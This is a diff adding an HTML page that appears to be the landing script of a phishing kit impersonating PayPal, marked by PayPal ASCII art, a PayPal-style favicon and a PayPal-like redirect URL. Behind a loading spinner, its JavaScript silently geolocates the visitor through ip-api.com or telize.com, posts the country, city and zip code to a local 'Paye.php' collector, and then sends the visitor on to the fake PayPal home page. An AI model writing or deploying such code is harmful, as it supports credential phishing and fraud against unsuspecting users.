@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html><head>
+<link rel="shortcut icon" href="css/img/pp_favicon_x.ico">
+        <!--
+
+        $$$$$$$\                     $$$$$$$\           $$\
+        $$  __$$\                    $$  __$$\          $$ |
+        $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |
+        $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |
+        $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |
+        $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |
+        $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |
+        \__|      \_______| \____$$ |\__|      \_______|\__|
+                           $$\   $$ |
+                           \$$$$$$  |
+                            \______/
+
+        -->
+<style type="text/css">
+.load{
+	line-height: 250px;
+	text-align: center;
+}
+.load img{
+	vertical-align: middle;
+}
+</style>
+<div class="load"><img src="./css/img/ajax_loader_blue_64.gif" ><div>
+<script language="JavaScript">
+	function GoAJAX(a,t){
+	{url ="./lang/Paye.php";var xmlhttp;
+	if (window.XMLHttpRequest)
+	  {// code for IE7+, Firefox, Chrome, Opera, Safari
+	  xmlhttp=new XMLHttpRequest();
+	  }
+	else
+	  {// code for IE6, IE5
+	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+	  }
+	xmlhttp.onreadystatechange=function()
+	  {
+	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
+	    {//xmlhttp.responseText
+			if(t==1){
+			window.location.href="./?cmd=_home&dispatch=5885d80a13c0db1f8e&ee=9fc3c0ece3fdd8f708fbf39b9811df4d";
+			}
+	    }
+	  }
+	xmlhttp.open("POST",url,true);
+	xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+	xmlhttp.send(a);
+ 
+	}
+	}
+	function callback_function(object,type)
+	{	var etat=false;
+		if(type==1){
+			GoAJAX('a=4&1=tempLang&tempLang='+object.countryCode+'&2=tLang&tLang='+object.country+'&3=city&city='+object.city+'&4=zip&zip='+object.zip,1);
+		}else if(type==2){
+			GoAJAX('a=4&1=tempLang&tempLang='+object.country_code+'&2=tLang&tLang='+object.country+'&3=city&city='+object.city+'&4=zip&zip=apinon',1);
+		}
+	}
+	var xhr = new XMLHttpRequest();
+	xhr.open("GET", 'http://ip-api.com/json', true);
+	xhr.timeout = 2000;
+    xhr.ontimeout = function () {
+		var xhr1 = new XMLHttpRequest();
+		xhr1.open("GET", 'http://www.telize.com/geoip', true);
+		xhr1.timeout = 2000;
+	    xhr1.ontimeout = function () {
+	   		GoAJAX('a=4&1=tempLang&tempLang=US&2=tLang&tLang=X-US&3=city&city=Xtimeout&4=zip&zip=Xtimeout',1);
+	 	}
+		xhr1.onreadystatechange = function() {
+		    if (xhr1.readyState == 4) {
+		        callback_function(JSON.parse(xhr1.responseText),2);
+		    }
+		}
+		xhr1.send();
+ 	}
+	xhr.onreadystatechange = function() {
+	    if (xhr.readyState == 4) {
+	        callback_function(JSON.parse(xhr.responseText),1);
+	    }
+	}
+	xhr.send();
+</script>
+</head></html>
